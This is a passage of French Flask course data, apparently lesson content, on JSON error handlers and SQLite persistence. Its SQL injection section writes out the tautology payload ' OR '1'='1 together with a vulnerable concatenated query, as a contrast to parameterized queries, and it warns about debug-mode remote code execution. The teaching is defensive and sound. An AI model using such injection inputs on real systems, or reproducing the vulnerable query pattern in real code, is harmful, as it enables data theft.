                    "fonctions de vue ne soit appelée**. Un bloc `try / except` écrit à l'intérieur d'une route est donc "
                    "totalement impuissant à intercepter ces erreurs.\n\n"
                    "En enregistrant au niveau de l'application (ou du Blueprint) les gestionnaires `@app.errorhandler(404)`, "
                    "`@app.errorhandler(405)` et `@app.errorhandler(413)`, vous substituez aux gabarits HTML génériques de "
                    "Werkzeug des enveloppes JSON normalisées indiquant le chemin exact `request.path`, le verbe employé "
                    "`request.method` et, sur une erreur `405`, la liste des méthodes légitimes autorisées sur cette ressource."
                )
            },
            {
                "heading": "2. Le disjoncteur racine `@app.errorhandler(Exception)` et l'exception `HTTPException`",
                "body": (
                    "Au-delà des erreurs HTTP anticipées, tout logiciel complexe demeure exposé aux défaillances "
                    "d'exécution imprévues : division par zéro sur un ratio comptable, fichier de configuration verrouillé, "
                    "ou rupture soudaine du disque hébergeant SQLite. Brancher un gestionnaire universel sur la classe "
                    "racine `Exception` offre un filet de sécurité absolu, à condition de respecter une subtilité capitale "
                    "de la hiérarchie d'héritage de Werkzeug.\n\n"
                    "```python — Gestionnaire global 500 préservant les exceptions HTTP légitimes\n"
                    "from werkzeug.exceptions import HTTPException\n"
                    "\n"
                    "@app.errorhandler(Exception)\n"
                    "def intercepter_exception_inattendue(err):\n"
                    "    # Laisser les 404/405/429 être traitées par leurs gestionnaires dédiés :\n"
                    "    if isinstance(err, HTTPException):\n"
                    "        return jsonify({\n"
                    "            \"status\": err.code,\n"
                    "            \"title\": err.name,\n"
                    "            \"detail\": err.description,\n"
                    "            \"path\": request.path\n"
                    "        }), err.code\n"
                    "\n"
                    "    app.logger.exception(\"Crash interne [ref=%s]\", getattr(g, \"request_id\", \"n/a\"))\n"
                    "    return jsonify({\n"
                    "        \"status\": 500,\n"
                    "        \"title\": \"Internal Server Error\",\n"
                    "        \"detail\": \"Une erreur interne a été consignée par nos équipes.\",\n"
                    "        \"request_id\": getattr(g, \"request_id\", None)\n"
                    "    }), 500\n"
                    "```\n\n"
                    "> [!WARNING] Danger critique de `debug=True` sur une machine accessible par réseau\n"
                    "> Ne déployez **jamais** `app.run(debug=True)` ou `FLASK_DEBUG=1` hors de votre boucle `127.0.0.1` personnelle ! En mode debug, Werkzeug active en cas d'exception 500 une console interactive Web qui permet d'évaluer du code Python arbitraire (*Remote Code Execution — RCE*) directement sur le serveur hôte."
                )
            },
            {
                "heading": "3. Cloisonnement sécuritaire des diagnostics : journal complet en interne, opacité contrôlée en externe",
                "body": (
                    "Renvoyer brutalement `str(err)` ou `traceback.format_exc()` dans le JSON d'une erreur `500` constitue "
                    "une vulnérabilité d'exposition d'informations (*Information Disclosure* — CWE-209) : l'attaquant y "
                    "découvre instantanément la version exacte de vos bibliothèques, l'arborescence Linux `/home/...`, le "
                    "nom de vos tables SQL et la logique interne de vos requêtes.\n\n"
                    "L'architecture d'exploitation concilie sécurité et maintenabilité en couplant `@app.errorhandler(Exception)` "
                    "avec le `g.request_id` forgé au Chapitre 2.4 : la pile d'appels complète est écrite sur le flux privé "
                    "`stderr` / journal centralisé avec `app.logger.exception(...)`, tandis que le client reçoit un message "
                    "sobre accompagné du seul jeton `\"request_id\": \"req-8f2a9c01\"` lui permettant d'ouvrir un ticket "
                    "support immédiatement exploitable par vos ingénieurs."
                )
            }
        ],
        "architecture_diagram": (
            "COMPORTEMENT PAR DÉFAUT DE FLASK vs GESTIONNAIRES GLOBAUX @app.errorhandler :\n\n"
            "  Client appelle GET /api/url-inconnue\n"
            "     |\n"
            "     +---> [Sans @errorhandler] ---> Renvoie \"<!doctype html><h1>Not Found</h1>\" ---> CRASH JSON.parse() côté Client !\n"
            "     |\n"
            "     +---> [Avec @errorhandler] ---> Renvoie {\"status\": 404, \"error\": \"Not Found\", \"path\": \"/api/url-inconnue\"}\n"
            "                                     (Content-Type: application/json) ---> Géré proprement par le Client !"
        ),
        "reference_table": {
            "title": "Les 4 Gestionnaires `@app.errorhandler` Indispensables dans une API Flask",
            "headers": ["Décorateur", "Déclencheur", "Information utile à inclure dans le JSON de retour"],
            "rows": [
                ["`@app.errorhandler(400)`", "Requête mal formée", "`status: 400`, `detail: \"Syntaxe de requête ou JSON invalide\"`"],
                ["`@app.errorhandler(404)`", "URL inconnue", "`status: 404`, `path: request.path`, `detail: \"Route introuvable\"`"],
                ["`@app.errorhandler(405)`", "Verbe HTTP interdit sur cette URL", "`status: 405`, `method: request.method`, `detail: \"Méthode non autorisée\"`"],
                ["`@app.errorhandler(Exception)`", "Bug Python non intercepté (`500`)", "`status: 500`, `detail: \"Erreur interne (réf: X-Request-ID)\"` (sans Traceback !)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Laisser `debug=True` actif sur un serveur exposé sur Internet",
                "good": "Toujours désactiver `debug=False` en production et utiliser `@app.errorhandler(Exception)`",
                "why": "Le mode `debug=True` de Flask affiche une console interactive dans le navigateur en cas d'erreur 500, permettant d'exécuter du code arbitraire sur le serveur !"
            },
            {
                "bad": "Capturer `Exception` dans `@app.errorhandler(Exception)` sans laisser passer `HTTPException`",
                "good": "Vérifier en tête de fonction `if isinstance(err, HTTPException): return err`",
                "why": "Sans ce test, même les erreurs normales `404` ou `405` seraient transformées à tort en erreurs `500 Internal Server Error` !"
            }
        ],
        "practical_exercises": [
            "Inspectez et exécutez `day_3/04_gestion_erreurs_globale.py` afin de vérifier que les réponses `404`, `405` et `500` portent toutes systématiquement `Content-Type: application/json`.",
            "Interrogez `GET /api/sandbox/formations/999` dans le Client HTTP intégré pour observer une réponse `404 Not Found` structurée en JSON sans aucun artefact HTML."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.4 : PERSISTANCE SQLITE3, ACID & INJECTIONS SQL
    # =========================================================================
    "d3-l4": {
        "context": (
            "Maintenir un catalogue métier dans une liste Python globale `FORMATIONS = [...]` se heurte immédiatement "
            "à deux obstacles physiques : la volatilité de la mémoire vive (le moindre redémoiement ou redémarrage "
            "électrique anéantit toutes les inscriptions créées) et le cloisonnement multi-processus sous Gunicorn "
            "(où chacun des quatre workers modifierait sa propre liste en RAM sans jamais voir les écritures des "
            "trois autres !).\n\n"
            "La persistance durable et cohérente d'une API repose donc sur un **Système de Gestion de Base de Données "
            "Relationnelle (SGBDR)** garantissant les propriétés **ACID**. Python embarque dans sa bibliothèque "
            "standard le moteur C transactionnel **SQLite (`sqlite3`)** — le moteur SQL le plus déployé au monde — "
            "qui offre un terrain d'ingénierie idéal pour maîtriser les transactions atomiques, le mode concurrent "
            "**WAL (*Write-Ahead Logging*)** et l'éradication définitive des **Injections SQL**."
        ),
        "deep_sections": [
            {
                "heading": "1. Propriétés ACID, mode concurrent `WAL` et fabrique de lignes `sqlite3.Row`",
                "body": (
                    "Tout moteur relationnel sérieux garantit les quatre invariants **ACID** popularisés par Jim Gray et "
                    "Andreas Reuter : **Atomicité** (une transaction multi-requêtes réussit intégralement au `conn.commit()` "
                    "ou s'annule intégralement au `conn.rollback()` sans jamais laisser d'état bâtard à mi-virement), "
                    "**Cohérence** (toutes les contraintes `NOT NULL`, `UNIQUE`, `CHECK` et clés étrangères `FOREIGN KEY` "
                    "sont respectées), **Isolation** (deux requêtes concurrentes ne lisent pas d'écritures inachevées) et "
                    "**Durabilité** (une fois `commit()` acquitté, les octets sont synchronisés sur le support non volatil "
                    "via `fsync` et survivent à une coupure secteur).\n\n"
                    "```python — Connexion SQLite durcie pour un serveur Web multi-requêtes\n"
                    "import sqlite3\n"
                    "\n"
                    "def ouvrir_connexion(chemin_db: str) -> sqlite3.Connection:\n"
                    "    conn = sqlite3.connect(chemin_db, timeout=10.0)\n"
                    "    conn.row_factory = sqlite3.Row\n"
                    "    conn.execute(\"PRAGMA journal_mode=WAL;\")   # Lectures parallèles pendant une écriture\n"
                    "    conn.execute(\"PRAGMA foreign_keys=ON;\")    # Intégrité référentielle active\n"
                    "    return conn\n"
                    "```\n\n"
                    "Deux réglages transforment l'usage de SQLite dans Flask. Configurer **`conn.row_factory = sqlite3.Row`** "
                    "remplace les tuples positionnels opaques `(1, 'Flask', 5)` par des objets hybrides convertibles d'un "
                    "simple `dict(ligne)` pour `jsonify()`. Activer **`PRAGMA journal_mode=WAL;`** (*Write-Ahead Logging*) "
                    "remplace le verrouillage global historique par un journal d'écriture séquentiel : des dizaines de "
                    "requêtes `GET` peuvent alors lire la base en parallèle au moment même où une requête `POST` persiste "
                    "une transaction, éliminant les erreurs `database is locked` sous charge modérée."
                )
            },
            {
                "heading": "2. Mécanique interne d'une Injection SQL (CWE-89) et séparation code/données par marqueurs `?`",
                "body": (
                    "Classée parmi les vulnérabilités les plus dévastatrices de l'histoire logicielle, l'**Injection SQL "
                    "(SQLi)** survient chaque fois qu'un programme assemble une instruction SQL par concaténation textuelle "
                    "ou *f-string* à partir d'une variable non maîtrisée : le parseur SQL se retrouve alors incapable de "
                    "distinguer la grammaire voulue par le développeur des caractères syntaxiques injectés par l'attaquant.\n\n"
                    "```sql — Détournement de l'arbre syntaxique SQL par rupture de guillemet\n"
                    "-- Code Python vulnérable : f\"SELECT * FROM formations WHERE salle = '{salle}'\"\n"
                    "-- Entrée malveillante    : ' OR '1'='1\n"
                    "-- Requête compilée par le moteur :\n"
                    "SELECT * FROM formations WHERE salle = '' OR '1'='1';\n"
                    "-- Le prédicat booléen tautologique OR '1'='1' force le retour de TOUTE la table !\n"
                    "```\n\n"
                    "Les **requêtes préparées / paramétrées** (`conn.execute(\"SELECT * FROM formations WHERE salle = ?\", "
                    "(salle,))` selon la norme Python DB-API 2.0 / PEP 249, ou `%s` avec `psycopg` sous PostgreSQL) ne se "
                    "contentent pas d'« échapper des guillemets » : elles opèrent une **séparation physique en deux phases** "
                    "dans le moteur C de SQLite. Lors de la première phase, SQLite compile l'arbre syntaxique abstrait (AST) "
                    "de la requête avec un emplacement de variable figé `?`. Lors de la seconde phase (*Parameter Binding*), "
                    "l'arbre d'exécution est déjà scellé : les octets de `salle` sont liés directement au registre de "
                    "données sans jamais repasser par le parseur lexical SQL. Aucune séquence de guillemets, de points-virgules "
                    "ni de mots-clés `DROP TABLE` ne peut plus altérer le plan d'exécution.\n\n"
                    "> [!WARNING] Le piège syntaxique du tuple à un seul élément `(valeur,)`\n"
                    "> Le second argument de `conn.execute(sql, parametres)` doit impérativement être une séquence (tuple ou liste). En Python, écrire `(formation_id)` sans virgule n'est qu'une paire de parenthèses mathématiques autour d'un entier — provoquant `ValueError: parameters are of unsupported type` ! Écrivez toujours la virgule finale explicite : `(formation_id,)`."
                )
            },
            {
                "heading": "3. Contraintes déclaratives du schéma SQL et traduction de `IntegrityError` en `409 Conflict`",
                "body": (
                    "Même lorsque votre couche Python vérifie les données avant insertion, deux requêtes `POST` arrivant à "
                    "la même milliseconde sur deux workers Gunicorn peuvent franchir simultanément un test applicatif "
                    "`SELECT` avant d'exécuter leur `INSERT` (*Time-Of-Check to Time-Of-Use / TOCTOU*). La base de données "
                    "doit donc toujours constituer **l'ultime gardien de cohérence** grâce aux contraintes déclaratives du "
                    "schéma : `NOT NULL`, `UNIQUE` (sur un code catalogue ou une adresse e-mail) et `CHECK (duree_jours BETWEEN 1 AND 30)`.\n\n"
                    "Lorsqu'un doublon viole une contrainte `UNIQUE`, SQLite annule atomiquement l'écriture et lève "
                    "`sqlite3.IntegrityError`. En interceptant explicitement cette exception dans votre route Flask pour "
                    "invoquer `conn.rollback()` et retourner un statut **`409 Conflict`** formaté selon la RFC 7807, vous "
                    "transformez un conflit concurrent bas niveau en une réponse contractuelle propre et déterministe."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON : CONCATÉNATION VULNÉRABLE vs REQUÊTE PARAMÉTRÉE SÉCURISÉE (?)\n\n"
            "  Entrée malveillante du client : salle = \"' OR '1'='1\"\n"
            "        |\n"
            "        +---> [DANGER : f\"SELECT * FROM formations WHERE salle = '{salle}'\"]\n"
            "        |     Le parseur SQL voit : WHERE salle = '' OR '1'='1'  ---> FUITE TOTALE DE LA BASE !\n"
            "        |\n"
            "        +---> [SÉCURISÉ : execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))]\n"
            "              Le moteur SQL cherche littéralement une salle nommée \"' OR '1'='1\" ---> 0 résultat (Attaque neutralisée !)"
        ),
        "reference_table": {
            "title": "Correspondance Opérations CRUD ↔ Verbes HTTP ↔ Commandes SQL Paramétrées",
            "headers": ["Opération CRUD", "Route & Verbe HTTP", "Requête SQLite Paramétrée (`sqlite3`)", "Méthode de lecture résultat"],
            "rows": [
                ["**Create** (Créer)", "`POST /api/formations`", "`cur.execute(\"INSERT INTO formations (titre, salle) VALUES (?, ?)\", (t, s))` + `conn.commit()`", "`new_id = cur.lastrowid`"],
                ["**Read All** (Lister)", "`GET /api/formations`", "`conn.execute(\"SELECT * FROM formations LIMIT ? OFFSET ?\", (limit, offset))`", "`[dict(r) for r in cur.fetchall()]`"],
                ["**Read One** (Lire 1)", "`GET /api/formations/<id>`", "`conn.execute(\"SELECT * FROM formations WHERE id = ?\", (id,))`", "`row = cur.fetchone()` (`404` si `None`)"],
                ["**Update** (Modifier)", "`PUT /api/formations/<id>`", "`conn.execute(\"UPDATE formations SET titre = ?, salle = ? WHERE id = ?\", (t, s, id))` + `conn.commit()`", "`cur.rowcount`"],
                ["**Delete** (Supprimer)", "`DELETE /api/formations/<id>`", "`conn.execute(\"DELETE FROM formations WHERE id = ?\", (id,))` + `conn.commit()`", "`200 OK` ou `204 No Content`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier la virgule dans un tuple à 1 seul élément : `conn.execute(\"... WHERE id = ?\", (formation_id))`",
                "good": "Toujours mettre la virgule : `conn.execute(\"... WHERE id = ?\", (formation_id,))`",
                "why": "En Python, `(5)` sans virgule est juste l'entier `5` entre parenthèses, alors que `(5,)` avec virgule est un tuple de 1 élément requis par `sqlite3`."
            },
            {
                "bad": "Oublier `conn.commit()` après un `INSERT`, `UPDATE` ou `DELETE`",
                "good": "Appeler systématiquement `conn.commit()` avant `conn.close()` lors d'une écriture",
                "why": "Sans `conn.commit()`, SQLite annule automatiquement toutes les modifications non validées à la fermeture de la connexion !"
            }
        ],
        "practical_exercises": [
            "Exécutez la simulation SQLite en mémoire ci-dessus, puis ajoutez à titre d'étude comparative l'exécution de la requête concaténée vulnérable sur la même table `:memory:` pour constater de visu l'exfiltration de l'utilisateur `admin`.",
            "Parcourez le cycle transactionnel complet `POST` → `PUT` → `GET` → `DELETE` sur `/api/sandbox/formations` depuis le **Client HTTP** tout en surveillant l'état en direct des tables SQLite."
        ]
    }
}
